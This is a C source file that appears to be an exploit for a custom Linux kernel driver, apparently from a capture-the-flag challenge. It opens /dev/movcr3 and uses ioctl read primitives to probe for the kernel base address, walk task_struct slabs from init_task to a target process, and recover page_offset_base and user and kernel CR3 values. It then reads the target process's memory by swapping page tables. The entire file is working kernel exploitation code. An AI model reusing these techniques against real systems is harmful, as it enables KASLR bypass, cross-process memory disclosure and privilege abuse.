#include <sys/fcntl.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define EXPL_TAG "[meow] "

#define DEV_PATH  "/dev/movcr3"
#define TARGET    "cocay"

#define READ_UD2        0x1001
#define READ_MCR3       0x1002

#define LEAK_SZ         0x1000
#define BUF_SZ          0x10000
#define TASK_STRUCT_CSZ 0xe40

#define INIT_FLAGS    0x4000
#define SZ_CONSTRAINT 2147483647
#define KBASE         0xffffffff81000000ull

#define INIT_TASK        0x1a0c900ull
#define INIT_MM          0x1b65ec0ull
#define PAGE_OFFSET_BASE 0x17c01f8ull
#define KERN_CR3C_OFFSET 0x265cb00ull // 0x265d 040 0x265d ac0 0x265c b00  0x265 dac0
#define death_offset     0x1a0cdb0ull

int fd;
unsigned int kbase_offset;
char buf[BUF_SZ];

struct dev_req {
    void *to;
    void *from;
    void *mp; 
};

struct second_dev_req {
    void *to;
    void *from;
    void *mp; 
    void *advanced;
};



typedef long long int64;
typedef unsigned long long p_ull;
typedef struct dev_req dev_req_s;

// utils

void panic(char *msg) {
    printf("%s: %s\n", EXPL_TAG, msg);
    exit(-1);
}

unsigned long long gkb() {
    return KBASE + kbase_offset;
}

void dump(void **buf) {
    for(int i = 0; i < 0x10000/8; i += 2) {
        printf("[%d] %p %p\n", i, buf[i], buf[i+1]);
    }
}

char *task_name(char *buf) {
    const tn_offset = 1816;
    char *task_name = (char *) malloc(16);


    memcpy(task_name, &buf[1816], 16);
    return task_name;
}

// void task_pd(void **buf) {
//     for(int i = 0; i < 0x10000/8; i += 2) {
//         printf("[%d] %p [%d] %p\n", i, buf[i], i+1, buf[i+1]);
//     }
// }

void *task_stack(void **buf) {
    return buf[160];
}

void *task_slub_leak(void **buf) {
    return buf[1200/8];
}

// device interfaces

void open_device() {
    fd = open(DEV_PATH, O_RDWR);
    if (fd < 0) {
        panic("device not found");
    }
}

int dev_ioctl(int cmd, void *arg) {
    int res;

    if((res = ioctl(fd, cmd, arg)) < 0) {
        // printf(EXPL_TAG "[BAD] got bad signal <ioctl: %d>\n", res);
    }

    return res;
}

int dev_read_ud2(int64 sz, void *from, void *to) {
    dev_req_s arg = {
        .to = to,
        .from = from,
        .mp = (void *) sz
    };

    if(sz > SZ_CONSTRAINT) {
        printf(EXPL_TAG "[BAD] got bad sz <read_ud2: %d>\n", sz);
    }

    return dev_ioctl(READ_UD2, &arg);
}

int dev_read_mcr3(void *f_cr3, void *s_cr3, void *from, void *to) {
    struct second_dev_req arg = {
        .to = to,
        .from = from,
        .mp = s_cr3,
        .advanced = f_cr3
    };

    return dev_ioctl(READ_MCR3, &arg);
}


// walker
p_ull the_walk(void **buf, p_ull offset) {
    p_ull cr3_val;

    puts("Started the walk");
    for(int i = 0; i < BUF_SZ/8; i += 1) {
        void *getter;
        void *tgt = (void *) ((char*)(buf[i]) + 128);

        int c = dev_read_ud2(8, tgt, &getter);
        cr3_val = (p_ull) getter - offset;

        if(c < 0 || ((cr3_val & 0xfff) != 0) || cr3_val > 0xf000000) continue;

        printf("CANDIDATE [$d] %p 0x%016llx\n", i, cr3_val);
        return cr3_val;
    }

    return -1;
}

int main(int argc, char **argv) {

    open_device();
    void *sl_leak;

    // 0x95
    
    // Leaking the kbase
    puts(EXPL_TAG "leaking kernel base");

    for(int i = 0; i < 4096; i += 1) {
        void *attempt = (void *) (KBASE + (i<<20));

        int res = dev_read_ud2(8, attempt, &buf);
        if(res == 0) {
            kbase_offset = attempt-KBASE;
            break;
        }
    }
    printf(EXPL_TAG "Found offset: %p <kbase: %p>\n", kbase_offset, gkb());

    // Calculate init_task address
    void *A_init_task = (void *) (gkb() + INIT_TASK);
    printf(EXPL_TAG "Calculated addresses <init_task: %p>\n", A_init_task);

    // Searching for our task starting from init_task
    dev_read_ud2(0x10000, A_init_task, &buf);
    if(((void **) &buf)[0] != INIT_FLAGS) {
        panic("failed to find init_task");
    }

    printf(EXPL_TAG "[debug] Taskname: %s\n", task_name(buf));

    // Brute for task_struct_slubs
    void *task_struct_slub = ((p_ull) ((void **) buf)[140]) & 0xffffffffffff0000ull;    
    for(int i = 0; i < 16; i += 1) {
        void *task_offset_leaker;
        void *check_position = ((p_ull)task_struct_slub + (i << 12));

        dev_read_ud2(0x8, (void *) check_position, &task_offset_leaker);
        if(task_offset_leaker == (void *) 0x4000) {
            task_struct_slub = check_position;
            break;
        }
    }
    printf(EXPL_TAG "Calculated task_struct_slub <base: %p>\n", task_struct_slub);

    char *tn;
    void *tgt;
    void *tst;

    for(int i = 0; i < 9; i += 1) {
        tgt = ((p_ull) task_struct_slub) + TASK_STRUCT_CSZ * i;
        dev_read_ud2(0x1000, tgt, &buf);

        
        tn  = task_name(buf);
        tst = task_stack((void **) &buf);

        void *new_sl_leak = task_slub_leak((void **) &buf);
        if((p_ull) new_sl_leak > (p_ull) sl_leak) {
            sl_leak = new_sl_leak;
        }

        printf(EXPL_TAG "Task <%p> as <%s>\n", tgt, tn);

        if(strcmp(tn, TARGET) == 0) {
            break;    
        }
    }

    if(strlen(tn) == 0) {
         panic("BAD com");
    }


    // Get page offset
    void *page_offset_base;
    if(dev_read_ud2(8, (void *)(gkb()+PAGE_OFFSET_BASE), &page_offset_base) < 0) {
       panic("Failed to get page_offset_base");
    } 
    printf(EXPL_TAG "gotcha: <page_offset_base: %p>\n", page_offset_base);

    // Hunt for pdt of target
    void *user_cr3 = the_walk((void **) &buf, (p_ull) page_offset_base);
    printf(EXPL_TAG "Got user_cr3: %p\n", user_cr3);

    void *mm_struct_slub_base = (void *)((p_ull) sl_leak & 0xffffffffffff0000);
    for(int i = 0; i < 16; i += 1) {
        void *again_offset_leaker;
        void *check_position = ((p_ull)mm_struct_slub_base + (i << 12));

        dev_read_ud2(0x8, (void *) check_position, &again_offset_leaker);
        if(again_offset_leaker == (void *) 0x1) {
            mm_struct_slub_base = check_position;
            break;
        }
    }

    printf(EXPL_TAG "Got mm_struct_slub_base: %p\n", mm_struct_slub_base);

    // Hunt for kernel cr3
    puts(EXPL_TAG "Started hunting");

    void *kern_cr3;
    

    for(int i = 0; i < 10; i += 1) {
        void *tgt_addr = (void *)(((p_ull) mm_struct_slub_base) + 0x540*i+0x80);

        if(dev_read_ud2(8, tgt_addr, &kern_cr3) < 0) {
            puts("Failed to get kern_cr3");
            break;
        } 

        printf(EXPL_TAG "[%p] %d -> %p\n", tgt_addr, i, (void *)((p_ull) kern_cr3 - (p_ull)page_offset_base));
    }
    
    

    if(argc == 2) {
        int ZHESTKI_offset = atoi(argv[1]);
        dev_read_ud2(8, (void *)(((p_ull) mm_struct_slub_base) + 0x540*ZHESTKI_offset+0x80), &kern_cr3);
        kern_cr3 = (void *)((p_ull) kern_cr3 - (p_ull)page_offset_base);

        
        printf(EXPL_TAG "trying injection: user=%p kernel=%p <tst: %p>\n", user_cr3, kern_cr3, tst);


        // Reading recursively
        for(int i = 0; i < 0x100; i += 1) {
            void *test_gather;
    //0x00498040
            void *s_addr = (void* ) 0x00498004;

            dev_read_mcr3(user_cr3, (void *)kern_cr3, s_addr+i, &test_gather);
            
            printf("%p => %p\n", s_addr+i, test_gather);
        }        
    }

    return 0;
}